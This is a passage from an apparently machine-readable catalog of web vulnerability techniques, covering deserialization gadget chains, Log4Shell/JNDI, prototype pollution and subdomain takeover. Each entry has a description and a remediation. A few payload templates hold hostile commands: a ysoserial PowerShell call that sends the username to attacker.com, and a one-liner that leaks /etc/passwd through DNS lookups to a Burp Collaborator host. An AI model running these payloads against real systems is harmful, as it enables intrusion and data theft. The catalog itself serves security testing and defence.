remediation: Ensure Livewire hydration processes are properly secured and validated, especially when dealing with user-controlled input.

title: Phar Metadata Deserialization via LFI
description: When a Local File Inclusion (LFI) vulnerability allows reading files, the phar protocol can be abused during deserialization when reading a phar archive, leading to code execution.
remediation: Avoid using file reading functions with user-controlled input without proper validation, and sanitize file paths to prevent phar:// protocol abuse.

title: Python Pickle Deserialization RCE
description: Unpickling untrusted data in Python can lead to arbitrary code execution by abusing the __reduce__ method, which is called during the unpickling process.
remediation: Avoid unpickling data from untrusted sources. If necessary, use safer serialization formats or implement strict validation.

title: Python YAML Deserialization RCE
description: Unsafe deserialization in Python YAML libraries can lead to remote code execution by exploiting the way YAML parsers handle complex object structures.
remediation: Use safe loading functions for YAML (e.g., yaml.safe_load) and avoid loading untrusted YAML data.

title: Python Class Pollution (Prototype Pollution)
description: Prototype pollution in Python allows attackers to modify the properties of objects, potentially leading to unintended behavior or code execution by altering class prototypes.
remediation: Sanitize user input carefully and avoid directly manipulating object prototypes or properties from untrusted sources.

title: NodeJS Deserialization with Magic Function Abuse
description: While NodeJS lacks explicit magic deserialization methods like PHP, abusing functions like toString, valueOf, or toJSON during deserialization, or exploiting promise return values, can lead to code execution.
remediation: Be cautious when deserializing objects in NodeJS and ensure that 'magic' functions or promise resolutions are not exploitable.

title: NodeJS Prototype Pollution (__proto__ and prototype)
description: Prototype pollution in NodeJS, particularly through __proto__ and prototype properties, allows attackers to modify the properties of objects globally, potentially leading to code execution or denial of service.
remediation: Sanitize all user-controlled input that might affect object prototypes or properties, and avoid merging untrusted data directly into objects.

title: NodeJS node-serialize RCE
description: The 'node-serialize' library allows serializing functions, and deserializing untrusted data can lead to remote code execution by invoking these serialized functions.
remediation: Avoid deserializing data from untrusted sources using 'node-serialize'. If necessary, ensure the data is validated and sanitized.

title: ObjectDataProvider Gadget for .NET Deserialization RCE
description: The ObjectDataProvider class allows wrapping an arbitrary object, setting arbitrary parameters via MethodParameters, and calling an arbitrary function via MethodName. When deserialized, this can lead to Remote Code Execution by invoking methods on unintended objects.
remediation: Avoid deserializing untrusted data. If deserialization is necessary, use safe methods and validate input carefully.

title: ExpandedWrapper for .NET Deserialization with ObjectDataProvider
description: ExpandedWrapper can encapsulate an ObjectDataProvider instance, allowing deserialization to create the ObjectDataProvider object. This is useful when the deserializer doesn't know the exact type of the wrapped object, enabling RCE via the encapsulated ObjectDataProvider.
remediation: Avoid deserializing untrusted data. If deserialization is necessary, use safe methods and validate input carefully.

title: Json.Net Deserialization with ObjectDataProvider Gadget
description: Json.NET can be abused to deserialize a malicious ObjectDataProvider object, leading to Remote Code Execution. By crafting a JSON payload that includes the necessary type information and method calls, an attacker can trigger arbitrary code execution.
remediation: Configure Json.NET's JsonSerializerSettings with TypeNameHandling = TypeNameHandling.None or TypeNameHandling.Objects to prevent deserialization of arbitrary types.

title: TypeConfuseDelegate Gadget Chain for .NET Deserialization
description: This gadget chain abuses DelegateSerializationHolder to corrupt delegate records. When deserialized, the delegate can be made to point to any attacker-supplied method, such as Process.Start, leading to Remote Code Execution.
remediation: Avoid deserializing untrusted data. Ensure that serialization formats and libraries used do not allow for the manipulation of delegate objects.

title: ActivitySurrogateSelector Gadget Chain for .NET Deserialization
description: Abuses System.Workflow.ComponentModel.ActivitySurrogateSelector to bypass .NET type filtering in versions >= 4.8. It allows direct invocation of a provided class's constructor or on-the-fly compilation of C# code, leading to RCE.
remediation: Avoid deserializing untrusted data. Keep .NET Framework and libraries updated to patch known vulnerabilities.

title: DataSetOldBehaviour Gadget Chain for .NET Deserialization
description: Leverages the legacy XML representation of System.Data.DataSet to instantiate arbitrary types. By manipulating the <ColumnMapping> and <DataType> fields, and optionally spoofing assemblies, attackers can achieve RCE.
remediation: Avoid deserializing untrusted XML data. Use modern XML parsers and validate input rigorously.

title: GetterCompilerResults Gadget Chain for .NET Deserialization
description: On runtimes with WPF enabled (>= .NET 5), this chain exploits property getters to reach System.CodeDom.Compiler.CompilerResults. It then compiles or loads a supplied DLL, enabling Remote Code Execution.
remediation: Avoid deserializing untrusted data. Ensure that serialization formats and libraries used do not allow for the manipulation of compiler results or code execution.

title: Java Deserialization leading to Remote Code Execution
description: Deserializing untrusted data using Java's ObjectInputStream can lead to Remote Code Execution if the deserialized object's readObject() method invokes dangerous operations like executing external commands.
remediation: Implement Java's ObjectInputFilter to restrict deserialized classes and limit the object graph depth and size, or avoid Java serialization entirely for untrusted data.

title: Spring Kafka deserialization of exception headers
description: Deserializing exception headers in Spring Kafka can lead to vulnerabilities if specific checkDeserExWhen flags are enabled, allowing attackers to potentially execute code.
remediation: Ensure proper configuration and sanitization of deserialized data, especially exception headers, in Spring Kafka consumers.

title: Aerospike Java client deserialization from server
description: The Aerospike Java client deserialized objects received from the server, creating a vulnerability where a malicious server could send crafted serialized objects to compromise the client.
remediation: Remove or restrict Java runtime serialization/deserialization support in clients that receive data from untrusted sources.

title: pac4j-core deserialization with RestrictedObjectInputStream
description: Even with RestrictedObjectInputStream, pac4j-core's deserialization could be exploited if the accepted class set was broad enough to allow gadget abuse.
remediation: Carefully curate the allowed class set for deserialization and ensure it is sufficiently restrictive.

title: Forge malicious __VIEWSTATE for deserialization RCE
description: When the validation and decryption keys for ASP.NET ViewState are known, an attacker can forge a malicious __VIEWSTATE payload. This payload, when deserialized by the application, can lead to remote code execution by exploiting vulnerable .NET gadgets.
remediation: Securely manage and protect ASP.NET machine keys, ensuring they are not hardcoded or publicly disclosed. Implement robust input validation and consider disabling ViewState if not strictly necessary.

title: Abuse __EVENTVALIDATION with known secrets
description: The same signing material used for __VIEWSTATE can potentially be abused against __EVENTVALIDATION. This requires a POST request, an application that processes input, and a valid control/input name.
remediation: Ensure proper validation and integrity checks for __EVENTVALIDATION, similar to __VIEWSTATE.

title: ASP.NET ViewState Deserialization leading to RCE
description: When ASP.NET ViewState is not properly secured (e.g., MAC disabled or encryption key compromised), an attacker can craft a malicious serialized ViewState payload. This payload, when deserialized by the application, can lead to arbitrary code execution on the server.
payload_templates: ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
remediation: Ensure ViewState MAC is enabled and a strong, unique MachineKey is used. Regularly rotate MachineKeys and avoid using default or easily guessable keys.

title: ASP.NET ViewState MAC Bypass
description: If the Message Authentication Code (MAC) for ViewState is disabled or the MachineKey is compromised, an attacker can tamper with the ViewState parameter without detection. This allows for manipulation of application state and potentially further exploitation.
remediation: Always enable ViewState MAC validation using a strong and unique MachineKey. Avoid reusing default or publicly known MachineKeys.

title: ASP.NET ViewState Encryption Bypass
description: If ViewState encryption is disabled or the encryption key is compromised, an attacker can read and modify the ViewState data. This can lead to manipulation of application state and potentially further exploitation, especially when combined with deserialization vulnerabilities.
remediation: Enable ViewState encryption with a strong, unique MachineKey. Ensure the `__VIEWSTATEENCRYPTED` parameter is correctly handled by the application.

title: Exploiting Recycled ASP.NET MachineKeys
description: When administrators reuse sample or leaked MachineKeys across multiple ASP.NET applications or servers, an attacker can leverage this. By obtaining a single leaked key, they can forge ViewState parameters for any application using the same key, leading to widespread compromise.
remediation: Generate and use unique, strong MachineKeys for each ASP.NET application and rotate them regularly. Avoid using keys from documentation or public sources.

title: Java Deserialization Triggering DNS Lookup
description: Deserializing a HashMap containing a URL object triggers a DNS lookup due to the URL class's hashCode implementation, which resolves the host. This can be used to confirm deserialization vulnerabilities or exfiltrate data.
remediation: Avoid deserializing untrusted data, or ensure that only safe and trusted classes are deserializable.

title: GadgetProbe for Java Deserialization Vulnerability Detection
description: GadgetProbe attempts to deserialize arbitrary Java classes to detect their presence on the server. If a DNS query is triggered, it indicates that the class exists and is potentially exploitable via deserialization.
remediation: Avoid deserializing untrusted data, or ensure that only safe and trusted classes are deserializable.

title: Automated Java Deserialization Vulnerability Scanner
description: This scanner passively checks for Java serialized magic bytes and actively tests for deserialization vulnerabilities using ysoserial payloads. It can use DNS, sleeps, or CPU consumption as oracles to detect vulnerable libraries.
payload_templates: (i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
remediation: Avoid deserializing untrusted data, or ensure that only safe and trusted classes are deserializable.

title: Java JSF ViewState Deserialization
description: JavaServer Faces (JSF) applications may serialize sensitive view state information. If this serialized data is not properly protected or validated, an attacker can craft malicious serialized objects to achieve Remote Code Execution (RCE) when the application deserializes the ViewState.
remediation: Ensure that the JSF ViewState is properly protected, for example, by signing or encrypting it, or by disabling state saving if not required.

title: SignedObject-gated Deserialization with Pre-auth Reachability via Error Paths
description: A deserialization vulnerability exists where a SignedObject is used to gate gadget chains. Exploitation requires bypassing signature verification or finding an alternate path that deserializes the inner object without checks. Pre-authentication reachability can be achieved by exploiting error-handling flows that inadvertently mint and attach tokens to unauthenticated sessions.
remediation: Maintain signature verification before getObject() calls, use hardened wrappers for inner deserialization, and remove error-handler flows that issue session-bound tokens for unauthenticated users.

title: Java Deserialization via Commons Collections
description: Exploits Java deserialization vulnerabilities using Apache Commons Collections to execute arbitrary code. The payload chains transformers to achieve remote code execution.
remediation: Avoid deserializing untrusted data or use secure deserialization libraries and configurations.

title: Java Deserialization via Commons Collections for Thread Sleep
description: Uses Java deserialization with Apache Commons Collections to execute a Thread.sleep() command. This is often used as a proof-of-concept to confirm deserialization vulnerabilities.
remediation: Avoid deserializing untrusted data or use secure deserialization libraries and configurations.

title: Log4Shell RCE via JNDI Lookup
description: Log4j versions 2.0-beta9 to 2.14.1 are vulnerable to remote code execution due to the JNDI lookup feature. Attackers can trigger code execution by logging specially crafted strings that cause Log4j to query a remote LDAP server, which then returns malicious Java code.
remediation: Upgrade Log4j to version 2.17.1 or later, or disable JNDI lookups.

title: Log4Shell DoS via JNDI Lookup Bypass
description: This vulnerability in Log4j 2.15.0, an incomplete fix for CVE-2021-44228, allows for Denial of Service attacks through crafted JNDI lookup payloads in non-default configurations.
remediation: Upgrade Log4j to version 2.16.0 or later.

title: Log4j 1.x Deserialization Vulnerability via JMSAppender
description: Log4j 1.x versions using JMSAppender in non-default configurations are vulnerable to untrusted deserialization, allowing for remote code execution.
remediation: Upgrade to log4j-core 2.17.0 or later, or migrate away from Log4j 1.x.

title: Logback Deserialization Vulnerability
description: The Logback logging framework, a successor to Log4j 1.x, was found to be vulnerable to deserialization attacks.
remediation: Upgrade Logback to versions 1.3.0-alpha11 or 1.2.9.

title: Log4j 2.16.0 DoS Vulnerability
description: Log4j 2.16.0 contained a Denial of Service flaw, necessitating the release of version 2.17.0 to address it.
remediation: Upgrade Log4j to version 2.17.0 or later.

title: Log4j 2.17.0 RCE via JDBCAppender
description: This vulnerability in Log4j version 2.17.0 allows for arbitrary code execution through a configured JDBCAppender, provided the attacker can control the log4j configuration file.
remediation: Upgrade Log4j to version 2.17.1 or later.

title: JNDI RCE via RMI Reference
description: JNDI Naming References, particularly those referencing remote factories via RMI, can be exploited to download and instantiate arbitrary Java code from an attacker-controlled location, leading to remote code execution.
remediation: Ensure `java.rmi.server.useCodebaseOnly` is set to `true` and utilize a Security Manager.

title: JNDI RCE via LDAP Reference
description: Exploiting JNDI lookups with LDAP can lead to remote code execution if `com.sun.jndi.ldap.object.trustURLCodebase` is set to `true`, allowing the download and instantiation of malicious Java classes from remote codebases.
remediation: Ensure `com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` and utilize a Security Manager.

title: JNDI RCE via CORBA Reference
description: While CORBA itself isn't inherently vulnerable, JNDI lookups referencing CORBA objects can lead to remote code execution if the Security Manager is not properly configured to restrict connections to malicious codebases.
remediation: Implement and strictly configure a Security Manager to restrict connections to trusted codebases.

title: JNDI LDAP Deserialization Exploit
description: When an LDAP server returns a serialized Java object in response to a JNDI lookup, and `trustURLCodebase` is true, the object can be deserialized and executed, leading to RCE. If `trustURLCodebase` is false, attackers must rely on existing gadgets in the classpath.
remediation: Set `com.sun.jndi.ldap.object.trustURLCodebase` to `false` and ensure a Security Manager is in place.

title: JNDI LDAP JavaFactory Reference Exploit
description: LDAP can be exploited using JavaFactory references, where a malicious LDAP server returns a reference to a factory class that, when instantiated, can lead to arbitrary code execution.
remediation: Disable JNDI lookups from untrusted sources and ensure proper validation of LDAP responses.

title: Livewire Snapshot Forgery via Updates (CVE-2025-54068)
description: Attacker-controlled updates to weakly typed properties can be rehydrated as synthetic tuples, allowing arbitrary class instantiation and execution chains even without the APP_KEY. This bypasses checksum validation by exploiting how updates are processed after the snapshot is verified.
remediation: Upgrade Livewire to a patched version (>= 3.6.4) and avoid weakly typed public properties in components.

title: Livewire Signed Snapshot Forgery with APP_KEY
description: When the APP_KEY is known, an attacker can forge Livewire snapshots by recomputing the HMAC checksum. This allows them to inject arbitrary synthetic tuples, leading to Remote Code Execution through gadget chains.
remediation: Keep the APP_KEY secret and rotate it promptly if compromised. Upgrade Livewire to patched versions.

title: Livewire CollectionSynth Arbitrary Instantiation
description: The CollectionSynth allows instantiation of arbitrary classes with an array constructor by providing attacker-controlled data. This can be chained with other synthesizers to build gadget chains for Remote Code Execution.
remediation: Register only necessary synthesizers and treat user-controlled metadata as untrusted.

title: Livewire FormObjectSynth Arbitrary Property Assignment
description: The FormObjectSynth allows instantiation of arbitrary classes and assignment of public properties from attacker-controlled children. This can be leveraged to instantiate objects with vulnerable public properties or to build gadget chains for Remote Code Execution.
remediation: Register only necessary synthesizers and treat user-controlled metadata as untrusted.

title: Livewire ModelSynth Zero-Argument Instantiation
description: When a 'key' is absent from metadata, the ModelSynth allows zero-argument instantiation of any attacker-controlled class. This can be used to instantiate vulnerable classes and build gadget chains for Remote Code Execution.
remediation: Register only necessary synthesizers and treat user-controlled metadata as untrusted.

title: Livewire RCE via phpggc Gadget Chain
description: Livewire's hydration mechanism can be abused to instantiate objects that trigger deserialization or method calls leading to Remote Code Execution. This is often achieved by chaining vulnerable classes like Guzzle's FnStream or Laravel's Queueable trait with phpggc payloads.
remediation: Upgrade Livewire to patched versions and avoid using vulnerable gadget chains.

title: Prototype pollution via jQuery $.extend
description: The $.extend function in jQuery can lead to prototype pollution when the deep copy feature is used improperly. Properties intended for a new object can be assigned to the prototype instead, potentially leading to unauthorized access.
remediation: Ensure proper validation and sanitization of inputs used with $.extend, especially when deep copying.

title: Prototype pollution via lodash
description: Lodash versions prior to 4.17.11 were susceptible to prototype pollution vulnerabilities. This allowed attackers to modify the Object.prototype, potentially leading to security risks.
remediation: Update lodash to version 4.17.11 or later.

title: Prototype pollution via lodash (another instance)
description: Another prototype pollution vulnerability in lodash, addressed in version 4.17.11, allowed modification of the Object.prototype. This could be exploited to introduce unintended properties or behaviors into all objects.
remediation: Update lodash to version 4.17.11 or later.

title: Prototype pollution to Remote Code Execution (RCE)
description: Prototype pollution can be leveraged to achieve Remote Code Execution (RCE) in Node.js environments. This often involves exploiting specific gadgets or functions that process user-controlled input and can be manipulated to execute arbitrary code.
remediation: Sanitize all user inputs and avoid directly using untrusted data in prototype manipulation functions. Use secure alternatives for code execution.

title: Client-side prototype pollution to Cross-Site Scripting (XSS)
description: Prototype pollution on the client-side can lead to Cross-Site Scripting (XSS) vulnerabilities. By injecting malicious HTML or JavaScript into an object's prototype, an attacker can cause arbitrary code execution within the user's browser.
remediation: Sanitize all user-provided data before rendering it in the DOM. Avoid using user input directly in HTML attributes or content.

title: Prototype pollution in Handlebars AST
description: Prototype pollution can occur in Handlebars template engines by manipulating the Abstract Syntax Tree (AST). This allows attackers to inject arbitrary code into template functions, potentially leading to RCE.
remediation: Ensure proper validation of AST nodes and user input processed by Handlebars. Update Handlebars to the latest secure version.

title: Prototype pollution in Pug AST
description: Similar to Handlebars, Pug template engines can be vulnerable to prototype pollution through manipulation of their Abstract Syntax Trees (AST). This can allow for the injection of malicious code.
remediation: Validate user input and AST structures processed by Pug. Keep Pug updated to the latest secure version.

title: Prototype pollution via array index manipulation
description: If an attacker can control array elements or indices that are later used in a way that accesses prototype properties, prototype pollution can occur. This allows modification of inherited properties for array elements.
remediation: Avoid directly using user-controlled array indices or elements to access or modify object prototypes.

title: Prototype pollution via HTML element innerHTML
description: When HTML elements are generated via JavaScript, overwriting the `innerHTML` attribute can lead to the injection of arbitrary HTML and JavaScript code, resulting in XSS. This can be achieved through prototype pollution.
remediation: Sanitize all HTML content before setting it to `innerHTML`. Use safer methods for DOM manipulation.

title: Prototype pollution to exploit undefined attributes
description: Prototype pollution can be used to set an undefined attribute on an object's prototype, which is then checked by the application. If the attribute is set to a malicious value (e.g., `true` for an admin check), it can lead to privilege escalation or other unintended behaviors.
remediation: Always check for the explicit existence of attributes before using them, rather than relying on default or inherited values.

title: Prototype pollution to override object functions
description: An attacker can use prototype pollution to override built-in or custom functions of objects. For example, overriding the `toString` method can alter how objects are represented or processed.
remediation: Avoid modifying prototypes of core JavaScript objects or objects that handle untrusted data. Implement strict input validation.

title: Client-Side Prototype Pollution
description: Prototype pollution occurs when an attacker can inject properties into Object.prototype, which are then inherited by all objects in the application. This can lead to various vulnerabilities, including XSS, cookie manipulation, and URL manipulation.
remediation: Sanitize user inputs and avoid directly merging untrusted data into object prototypes. Use Object.create(null) for objects that should not inherit properties.

title: HTML Sanitizer Bypass via Prototype Pollution
description: Prototype pollution can be used to bypass HTML sanitizers by manipulating their configuration or allow-lists. This allows attackers to inject malicious HTML and achieve Cross-Site Scripting (XSS).
remediation: Ensure that sanitizer configurations are not directly controllable by user input and that prototype pollution is mitigated.

title: Vue Gadget leading to Prototype Pollution
description: A specific gadget found in Vue.js has been identified that, when combined with prototype pollution, can lead to exploitable consequences. This highlights how framework-specific vulnerabilities can be amplified by prototype pollution.
remediation: Keep Vue.js and other frameworks updated to their latest secure versions and mitigate prototype pollution vulnerabilities.

title: Express Prototype Pollution leading to XSS via JSON content-type
description: Prototype pollution can confuse Express to serve HTML responses when a JSON content type is expected. By polluting '__proto__' properties, an attacker can cause Express to reflect HTML content, leading to stored XSS.
remediation: Sanitize or validate user-supplied JSON data before processing it with functions like _.merge.

title: Express Prototype Pollution to render UTF-7 content
description: Prototype pollution can be used to manipulate the 'content-type' header to 'application/json; charset=utf-7'. This can lead to the server rendering UTF-7 encoded content, potentially resulting in XSS.
remediation: Avoid setting content-type headers based on user-controlled input.

title: Express Prototype Pollution for JSON spaces
description: Prototype pollution can inject a 'json spaces' property, causing attributes within a reflected JSON to gain an extra space. This might be used in conjunction with other vulnerabilities.
remediation: Validate and sanitize JSON input.

title: Express Prototype Pollution to expose HTTP headers
description: Prototype pollution can be used to inject a value into the 'exposedHeaders' property, causing the server to send back specific HTTP headers like 'Access-Control-Expose-headers: foo'. This requires the CORS module.
remediation: Do not allow prototype pollution to control CORS configuration.

title: Express Prototype Pollution to hide OPTIONS method
description: By polluting the '__proto__' with a 'head' property set to true, it's possible to hide certain methods from an OPTIONS response in Express.
remediation: Validate input used to configure HTTP methods.

title: Express Prototype Pollution to change status code
description: Prototype pollution can be leveraged to modify the 'status' property, allowing an attacker to change the HTTP status code returned by the server.
remediation: Do not allow user input to directly control HTTP status codes.

title: Express Prototype Pollution error detection
description: Prototype pollution can be detected by observing whether assigning a primitive to '__proto__.__proto__' throws an exception (indicating a successful pollution of Object.prototype) or is a no-op.
remediation: Implement robust input validation to prevent prototype pollution.

title: Express Prototype Pollution reflected value detection
description: Prototype pollution can be identified if an attribute with an unusual name alongside '__proto__' is returned, or if a property set via prototype pollution is omitted from the response when also set directly.
remediation: Validate and sanitize user input, especially when dealing with object merging.

title: Express Prototype Pollution with allowDots option
description: When the 'allowDots' option is enabled in Express, query string parameters with dots can be used to create nested objects. This can be chained with prototype pollution to exploit vulnerabilities.
remediation: Disable the 'allowDots' option or strictly validate query parameters.

title: Prototype Pollution to RCE via environment variables
description: Prototype pollution in Node.js's child_process module can lead to RCE by manipulating environment variables. By polluting the `__proto__.env` or `constructor.prototype.env` attributes, an attacker can inject malicious environment variables that are then used when spawning a new process.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution to RCE via command line arguments
description: Prototype pollution can be leveraged to achieve RCE by manipulating command-line arguments. By polluting `__proto__.argv0` and setting `NODE_OPTIONS` to require `/proc/self/cmdline`, an attacker can inject code that gets executed when a child process is spawned.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Filesystem-less Prototype Pollution RCE via --import (Node >= 19)
description: In Node.js versions 19 and later, prototype pollution can lead to RCE without filesystem access by using the `--import` flag with data URIs. By polluting `NODE_OPTIONS` with a data URI containing JavaScript, an attacker can execute arbitrary code.
remediation: Update Node.js to a version where data URIs in `--import` are restricted, or implement strict input validation to prevent prototype pollution.

title: Prototype Pollution RCE via exec() and cmdline
description: Prototype pollution can be used to achieve RCE through the `exec()` function by manipulating command-line arguments. By polluting `__proto__.shell`, `__proto__.argv0`, and setting `NODE_OPTIONS` to require `/proc/self/cmdline`, an attacker can execute arbitrary commands.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via exec() on Windows
description: On Windows systems, prototype pollution can lead to RCE through the `exec()` function by setting the `__proto__.shell` attribute to a malicious executable path, such as `calc.exe`.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via execFile() and cmdline
description: Prototype pollution can enable RCE via `execFile()` by manipulating command-line arguments. By polluting `__proto__.shell`, `__proto__.argv0`, and setting `NODE_OPTIONS` to require `/proc/self/cmdline`, an attacker can execute arbitrary commands when Node.js is the target executable.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via fork() and environment variables
description: Prototype pollution can lead to RCE through the `fork()` function by injecting malicious environment variables. By polluting `__proto__.env` and setting `NODE_OPTIONS` to require `/proc/self/environ`, an attacker can execute arbitrary code within the forked process.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via fork() and command line arguments
description: Prototype pollution can enable RCE via the `fork()` function by manipulating command-line arguments. By polluting `__proto__.argv0` and setting `NODE_OPTIONS` to require `/proc/self/cmdline`, an attacker can execute arbitrary commands when a new process is forked.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via fork() and execArgv
description: Prototype pollution can lead to RCE through the `fork()` function by manipulating the `execArgv` attribute. By setting `__proto__.execPath`, `__proto__.argv0`, and `__proto__.execArgv`, an attacker can control the arguments passed to the forked process and execute arbitrary commands.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via fork() on Windows
description: On Windows systems, prototype pollution can enable RCE through the `fork()` function by setting the `__proto__.execPath` attribute to a malicious executable path, such as `calc.exe`.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: Prototype Pollution RCE via DNS interaction
description: Prototype pollution can be used to trigger DNS interactions for detection purposes. By manipulating `NODE_OPTIONS` with `--inspect` and a controllable domain, an attacker can confirm the vulnerability and potentially exfiltrate data.
remediation: Sanitize user input before merging it into objects, especially when dealing with prototype properties. Use libraries that prevent prototype pollution or ensure that user-controlled data cannot reach sensitive merge functions.

title: PHP Deserialization with Autoloading for Gadget Chaining
description: Abuses PHP deserialization in conjunction with `spl_autoload_register` to load classes from external or local files. This allows an attacker to load vulnerable libraries or gadgets from other applications within the same container, ultimately leading to Remote Code Execution.
remediation: Avoid deserializing untrusted user input. Sanitize or validate input before deserialization, or use safer data serialization formats.

title: PHPUnit PHPT Coverage Deserialization
description: PHPUnit versions prior to specific patches are vulnerable to deserialization of arbitrary PHP objects from `.coverage` files generated by the PHPT runner. In CI/CD environments, this allows an attacker to achieve RCE within the runner container by submitting a malicious `.coverage` file.
payload_templates:
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
remediation: Update PHPUnit to a patched version. Avoid running test suites with untrusted code or coverage files.

title: TCPDF __destruct POP Chain for Arbitrary File Deletion
description: When a TCPDF object is garbage collected, its `__destruct` method calls `_destroy` which iterates over `$this->imagekeys` and `unlink`s files. An attacker can provide a serialized TCPDF object that manipulates these properties to delete arbitrary files on the filesystem.
remediation: Ensure TCPDF is updated to a patched version. Avoid deserializing untrusted user input.

title: html2pdf Phar Deserialization via TCPDF Gadget
description: Older versions of `spipu/html2pdf` can be exploited by crafting a Phar archive containing a serialized TCPDF object. When a `<cert>` tag with a `phar://` URL is processed, PHP's Phar deserialization mechanism triggers the TCPDF gadget, leading to arbitrary file deletion.
remediation: Update html2pdf to a patched version. Avoid processing untrusted Phar archives or using `phar://` URLs with sensitive functions.

title: GiveWP Unauthenticated POP Chain to RCE
description: GiveWP versions up to 3.14.1 are vulnerable to unauthenticated deserialization of the `give_title` field during donation processing. This allows an attacker to trigger a POP chain leading to arbitrary command execution or file deletion.
remediation: Update GiveWP to version 3.14.2 or later. Avoid deserializing untrusted user input.

title: Python YAML Deserialization leading to RCE
description: Deserializing untrusted YAML input using unsafe loaders in Python libraries like PyYAML can lead to arbitrary code execution by crafting malicious payloads that leverage Python's object serialization capabilities.
remediation: Always use `yaml.safe_load()` or `yaml.safe_load_all()` to deserialize YAML, or explicitly specify a safe loader like `Loader=yaml.SafeLoader`.

title: JSON Pollution via _json parameter
description: An attacker can inject arbitrary values into the `_json` parameter within a JSON request body. If the backend processes both a specific parameter and the `_json` parameter, this can lead to authorization bypass by manipulating the `_json` value.
remediation: Sanitize or validate all user-supplied input, especially when processing JSON bodies and using parameters like `_json` for sensitive operations.

title: Ruby Class Pollution - Privilege Escalation via Attribute Injection
description: An attacker can inject attributes into a user object, such as overriding the 'to_s' method to return 'Admin', thereby bypassing authorization checks and gaining elevated privileges.
remediation: Sanitize or validate user-supplied input before merging it into objects, especially when it can affect method behavior or class attributes.

title: Ruby Class Pollution - Remote Code Execution via instance_eval
description: When a 'health_check' method uses 'instance_eval' on user-supplied method names, an attacker can inject arbitrary code by providing malicious method names, leading to remote code execution.
remediation: Avoid using 'instance_eval' with untrusted input. If necessary, strictly validate and sanitize the input to ensure it only contains safe method calls.

title: Hashie Class Pollution - Privilege Escalation via Special Attribute '_'
description: In Hashie's 'deep_merge', the special attribute '_' can be modified, allowing an attacker to bypass checks like '_to_s == "Admin"' by injecting 'Admin' into this attribute, leading to privilege escalation.
remediation: Be cautious when using 'deep_merge' with user-controlled data, especially with libraries like Hashie that have specific attribute exceptions.

title: Ruby Class Pollution - Class Variable Poisoning
description: By exploiting the recursive merge functionality, an attacker can inject data that modifies class variables (e.g., '@@url' or '@@signing_key') in parent or unrelated classes, leading to unintended behavior or further exploitation.
remediation: Strictly validate and sanitize all user-supplied input, especially when it's used to modify class attributes or variables.

title: Ruby Class Pollution - Server-Side Request Forgery via Class Variable
description: After poisoning the '@@url' class variable in the 'Person' class, an attacker can trigger an HTTP request to an arbitrary URL controlled by them, leading to Server-Side Request Forgery.
remediation: Never use user-controlled input to construct URLs for server-side requests. Validate and sanitize all URL components.

title: Subdomain Takeover for Phishing
description: An attacker can register a lost or unclaimed subdomain that points to a third-party service. This allows them to host malicious content, leading to phishing attacks by leveraging the trusted domain name.
remediation: Remove vulnerable DNS records or claim the domain/resource.

title: Subdomain Takeover with Malicious SSL Certificates
description: Attackers can obtain SSL certificates for a taken-over subdomain, making phishing sites appear more legitimate and trustworthy to users, thereby increasing the success rate of attacks.
remediation: Ensure proper domain ownership verification for SSL certificate issuance and remove vulnerable DNS records.

title: Subdomain Takeover for Session Cookie Theft
description: By taking over a subdomain, an attacker can trick users into visiting it, potentially leading to the theft of session cookies sent via GET parameters or Referer headers, compromising user sessions.
remediation: Remove vulnerable DNS records and implement secure cookie handling practices.

title: Subdomain Takeover for CORS Bypass
description: If a taken-over subdomain is allowed to access CORS resources from the main domain or other subdomains, an attacker can exploit this to access sensitive information.
remediation: Implement strict CORS policies and remove vulnerable DNS records.

title: Subdomain Takeover for CSRF Same-Site Cookie Bypass
description: A taken-over subdomain might be able to send cookies to the main domain, bypassing Same-Site cookie protections. This can lead to CSRF attacks if anti-CSRF tokens are not properly implemented.
remediation: Implement robust anti-CSRF tokens and remove vulnerable DNS records.

title: Subdomain Takeover for OAuth Token Theft
description: If a taken-over subdomain is permitted in an OAuth flow's redirect_uri, an attacker can exploit this to steal OAuth tokens, potentially gaining unauthorized access to user accounts.
remediation: Validate redirect_uri strictly and remove vulnerable DNS records.

title: Subdomain Takeover for CSP Bypass
description: If a taken-over subdomain is allowed in Content Security Policy (CSP) directives like `script-src`, an attacker can inject malicious scripts, leading to XSS vulnerabilities.
remediation: Strictly define CSP directives and remove vulnerable DNS records.

title: Subdomain Takeover for Email Manipulation
description: Attackers can manipulate MX records of a taken-over subdomain to receive or send emails from a legitimate domain, enhancing phishing and social engineering attacks.
remediation: Remove vulnerable DNS records and monitor MX records.

title: NS Record Takeover
description: Gaining control over an NS (Name Server) record of a domain allows an attacker to direct a portion of the domain's traffic to their own servers, potentially leading to widespread compromise.
remediation: Secure NS records and remove vulnerable DNS configurations.

title: CNAME Record Takeover
